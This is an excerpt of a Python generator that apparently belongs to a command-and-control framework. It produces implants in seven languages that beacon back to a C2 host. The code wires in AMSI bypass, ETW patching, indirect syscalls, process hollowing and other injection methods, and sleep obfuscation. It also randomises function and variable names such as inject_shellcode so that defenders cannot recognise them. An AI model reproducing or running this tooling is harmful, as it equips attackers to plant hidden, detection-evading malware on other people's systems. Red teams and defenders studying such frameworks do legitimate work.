...
from evasion import EvasionConfig, get_all_evasion_code
...
class AgentGenerator:
    ...
    def __init__(self, output_dir: str = "output", patterns: str = "default"):
        self.output_dir = Path(output_dir)
        self.templates_dir = Path("templates")
        self.output_dir.mkdir(exist_ok=True)
        self.patterns = PatternProvider(patterns)
    ...
    def random_string(self, length: int = 8) -> str:
        return self.patterns.random_string(length)

    def random_var_name(self) -> str:
        return self.patterns.random_var_name()

    def generate_junk_code(self) -> str:
        return self.patterns.random_junk()
    ...
    def reduce_entropy_with_syntax(self, content: str, language: str) -> str:
        ...
        padding_words = self.patterns.padding_words
...
'''
    ...
    def obfuscate_strings(self, content: str) -> str:
        ...
        func_mappings = {
            ...
            'patch_amsi': self.random_var_name(),
            'patch_etw': self.random_var_name(),
            'SyscallResolver': self.random_var_name(),
            'inject_shellcode': self.random_var_name(),
            'obfuscated_sleep': self.random_var_name(),
            'find_target_process': self.random_var_name(),
            'get_image_regions': self.random_var_name(),
            'StreamingSleepObfuscator': self.random_var_name(),
        ...
        var_replacements = {
            ...
            'syscall_resolver': self.random_var_name(),
            'image_regions': self.random_var_name(),
            'watcher_thread': self.random_var_name(),
            'wake_event': self.random_var_name(),
        }
        ...
        for string_val, context in strings_to_obfuscate:
            if context == 'type':
                ...
                encoding_type = random.choice(self.patterns.string_encodings)
...
'''
    ...
    def obfuscate_powershell(self, content: str) -> str:
        ...
        func_map = {
            ...
            'Invoke-PatchAmsi': f'Invoke-{self.random_string(8)}',
            'Invoke-PatchEtw': f'Invoke-{self.random_string(8)}',
            'New-SyscallResolver': f'New-{self.random_string(8)}',
            'Invoke-Inject': f'Invoke-{self.random_string(8)}',
            'Invoke-SleepObfuscation': f'Invoke-{self.random_string(8)}',
            'Find-TargetProcess': f'Find-{self.random_string(8)}',
            'Get-ImageRegions': f'Get-{self.random_string(8)}',
            'Start-SleepWatcher': f'Start-{self.random_string(8)}',
        }
        ...
        ps_vars = [
            ...
            '$bytes', '$hwnd',
            '$syscallResolver', '$imageRegions', '$watcherThread', '$wakeEvent'
        ]
        for v in ps_vars:
...
'''
    ...
    def generate_python_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                              ...
                              redirector: str = None, bof: bool = False,
        ...
        Args:
            ...
            amsi: Enable AMSI bypass (Windows only)
            etw: Enable ETW patching (Windows only)
            syscalls: Syscall mode ('direct', 'indirect', or None)
            inject: Process injection technique ('createthread', 'apc', 'hollowing', 'stomp', or None)
            inject_target: Target process for injection
            sleep_obf: Sleep obfuscation technique ('ekko', 'foliage', or None)
            idle_encrypt: Streaming mode idle threshold in seconds
            profile: Malleable C2 profile name
        ...
        # Build evasion config and inject evasion code
        ...
        evasion_blocks = get_all_evasion_code('python', evasion_cfg)

        # Replace evasion placeholders (empty string for features not enabled)
        all_placeholders = [
            'EVASION_CRYPTO', 'EVASION_AMSI', 'EVASION_ETW',
            'EVASION_SYSCALLS', 'EVASION_INJECT', 'EVASION_SLEEP',
            'TRANSPORT_BLOCK',
        ]
        for ph in all_placeholders:
            content = content.replace('{{' + ph + '}}', evasion_blocks.get(ph, ''))

        # Print status for enabled features
        print(f"[*] AES-256-GCM encryption enabled")
        if amsi:
            print(f"[*] AMSI bypass enabled")
        if etw:
            print(f"[*] ETW patching enabled")
        if syscalls:
            gate_name = "Tartarus' Gate" if syscalls == 'indirect' else 'direct'
            print(f"[*] {'Indirect' if syscalls == 'indirect' else 'Direct'} syscalls enabled ({gate_name})")
        if inject:
            print(f"[*] Process injection enabled ({inject})")
        if sleep_obf:
            print(f"[*] Sleep obfuscation enabled ({sleep_obf})")
        if profile != 'default':
            print(f"[*] Malleable C2 profile: {profile}")
        ...
        # Apply obfuscation
        if obfuscate:
            if obfuscation == 'dynamic':
                from obfuscators import registry
                content = registry.chain(content, 'python', evasion_cfg, names=['dynamic'])
                print(f"[*] Applied dynamic multi-layer obfuscation (unique fingerprint)")
            elif obfuscation and ',' in obfuscation:
                from obfuscators import registry
                names = [n.strip() for n in obfuscation.split(',')]
                content = registry.chain(content, 'python', evasion_cfg, names=names)
                print(f"[*] Applied custom obfuscation pipeline: {', '.join(names)}")
            elif obfuscation:
                from obfuscators import registry
                content = registry.chain(content, 'python', evasion_cfg, names=[obfuscation])
                print(f"[*] Applied obfuscation: {obfuscation}")
            else:
        ...
        if redirector:
            ...
            if redir_config.listen:
                ...
                try:
                    ...
                    pass
            print(f"[*] PowerShell agent will connect via redirector: {connect_host}:{connect_port}")
    ...
    def generate_go_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
                           ...
                           env_hostname: str = '', env_domain: str = '',
                           env_mac: str = '', env_registry: str = '',
                           env_string: str = '') -> str:
        ...
        if env_hostname:
            ldflag_parts.append(f'-X "{pkg}.configSysHostname={env_hostname}"')
        if env_domain:
            ldflag_parts.append(f'-X "{pkg}.configSysDomain={env_domain}"')
        if env_mac:
            ldflag_parts.append(f'-X "{pkg}.configSysMAC={env_mac}"')
        if env_registry:
            ldflag_parts.append(f'-X "{pkg}.configSysRegistry={env_registry}"')
        if env_string:
            ldflag_parts.append(f'-X "{pkg}.configSysString={env_string}"')

        ldflags = ' '.join(ldflag_parts)
    ...
    def generate_shellcode_blob(self, c2_host: str, c2_port: int,
        ...
        evasion_blocks = get_all_evasion_code('powershell', evasion_cfg)
        ...
        print(f"[*] AES-256-GCM encryption enabled (PowerShell)")
        if amsi:
            print(f"[*] AMSI bypass enabled (PowerShell)")
        if etw:
            print(f"[*] ETW patching enabled (PowerShell)")
        if syscalls:
            print(f"[*] {'Indirect' if syscalls == 'indirect' else 'Direct'} syscalls enabled (PowerShell)")
        if inject:
            print(f"[*] Process injection enabled ({inject}, PowerShell)")
        if sleep_obf:
            print(f"[*] Sleep obfuscation enabled ({sleep_obf}, PowerShell)")
        if profile != 'default':
            print(f"[*] Malleable C2 profile: {profile} (PowerShell)")
    ...
    def generate_javascript_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
        ...
        if redirector:
            ...
            if redir_config.listen:
                ...
                try:
                    ...
                    pass
            print(f"[*] JavaScript agent will connect via redirector: {connect_host}:{connect_port}")
        ...
        # Build evasion config and inject crypto + profile code
        evasion_cfg = EvasionConfig(profile=profile)
        evasion_blocks = get_all_evasion_code('javascript', evasion_cfg)

        for ph in ['EVASION_CRYPTO', 'TRANSPORT_BLOCK']:
            content = content.replace('{{' + ph + '}}', evasion_blocks.get(ph, ''))

        print(f"[*] AES-256-GCM encryption enabled (JavaScript)")
        if profile != 'default':
            print(f"[*] Malleable C2 profile: {profile} (JavaScript)")
    ...
    def generate_hta_agent(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
        ...
        if redirector:
            ...
            if redir_config.listen:
                ...
                try:
                    ...
                    pass
            print(f"[*] HTA agent will connect via redirector: {connect_host}:{connect_port}")
        ...
        # Build evasion config and inject crypto + profile code
        evasion_cfg = EvasionConfig(profile=profile)
        evasion_blocks = get_all_evasion_code('vbscript', evasion_cfg)

        for ph in ['EVASION_CRYPTO', 'TRANSPORT_BLOCK']:
            content = content.replace('{{' + ph + '}}', evasion_blocks.get(ph, ''))

        print(f"[*] AES-CBC+HMAC encryption enabled (HTA)")
        if profile != 'default':
            print(f"[*] Malleable C2 profile: {profile} (HTA)")
...
'''
    ...
    def generate_all(self, c2_host: str, c2_port: int, encryption_key: str = 'SOCKPUPPETS_KEY_2026',
        ...
        Args:
            ...
            syscalls: Syscall mode ('direct', 'indirect', or None)
            inject: Process injection technique
            inject_target: Target process for injection
            sleep_obf: Sleep obfuscation technique ('ekko', 'foliage', or None)
            idle_encrypt: Streaming mode idle threshold in seconds
            profile: Malleable C2 profile name
        ...
        try:
            results['powershell'] = self.generate_powershell_agent(
                c2_host, c2_port, ps_key,
                amsi=amsi, etw=etw, syscalls=syscalls,
                inject=inject, inject_target=inject_target,
                sleep_obf=sleep_obf, idle_encrypt=idle_encrypt, profile=profile,
        ...
        try:
            results['javascript'] = self.generate_javascript_agent(
                c2_host, c2_port, js_key, profile=profile,
                redirector=redirector,
        ...
        try:
            results['hta'] = self.generate_hta_agent(
                c2_host, c2_port, hta_key, profile=profile,
                redirector=redirector,
                transport=transport, beacon_interval=beacon_interval,
                beacon_jitter=beacon_jitter,
            )
        ...
        # Generate native compiled agents (Go, Rust, C)
        native_transport = transport if transport in ('http', 'https') else 'http'
        try:
            results['go'] = self.generate_go_agent(
                c2_host, c2_port, encryption_key,
                transport=native_transport, beacon_interval=beacon_interval,
                beacon_jitter=beacon_jitter, target_os=target_os,
                unique_key=unique_key,
            )
            print(f"[+] Go agent generated: {results['go']}")
        except Exception as e:
            results['go'] = f"Error: {str(e)}"
            print(f"[-] Go agent failed: {str(e)}")

        try:
            results['rust'] = self.generate_rust_agent(
                c2_host, c2_port, encryption_key,
                transport=native_transport, beacon_interval=beacon_interval,
                beacon_jitter=beacon_jitter, target_os=target_os,
                unique_key=unique_key,
            )
            print(f"[+] Rust agent generated: {results['rust']}")
        except Exception as e:
            results['rust'] = f"Error: {str(e)}"
            print(f"[-] Rust agent failed: {str(e)}")

        try:
            results['c'] = self.generate_c_agent(
                c2_host, c2_port, encryption_key,
                transport=native_transport, beacon_interval=beacon_interval,
                beacon_jitter=beacon_jitter,
                unique_key=unique_key,
            )
            print(f"[+] C agent generated: {results['c']}")
        except Exception as e:
...
if __name__ == '__main__':
    ...
    evasion_group.add_argument('--amsi', action='store_true', help='Enable AMSI bypass (Windows, Python/PS)')
    evasion_group.add_argument('--etw', action='store_true', help='Enable ETW patching (Windows, Python/PS)')
    evasion_group.add_argument('--syscalls', choices=['direct', 'indirect'], default=None,
                               help='Enable syscall wrappers: indirect (default), direct')
    evasion_group.add_argument('--inject', choices=['createthread', 'apc', 'hollowing', 'stomp'], default=None,
                               help='Process injection technique')
    evasion_group.add_argument('--inject-target', dest='inject_target', type=str, default=None,
                               help='Target process for injection (default: auto-select)')
    evasion_group.add_argument('--sleep-obf', dest='sleep_obf', choices=['ekko', 'foliage'], default=None,
                               help='Sleep obfuscation technique')
    evasion_group.add_argument('--idle-encrypt', dest='idle_encrypt', type=int, default=30,
                               help='Streaming mode idle encryption threshold in seconds (default: 30)')
    evasion_group.add_argument('--profile', type=str, default='default',
                               help='Malleable C2 profile name (default: default)')
    evasion_group.add_argument('--evasion-all', dest='evasion_all', action='store_true',
                               help='Enable all evasion features with defaults')
    ...
    if args.evasion_all:
        ...
        if args.syscalls is None:
            args.syscalls = 'indirect'
        if args.inject is None:
            args.inject = 'hollowing'
        if args.sleep_obf is None:
            args.sleep_obf = 'ekko'
    ...
    results = generator.generate_all(
        ...
        amsi=args.amsi, etw=args.etw, syscalls=args.syscalls,
        inject=args.inject, inject_target=args.inject_target,
        sleep_obf=args.sleep_obf, idle_encrypt=args.idle_encrypt, profile=args.profile,
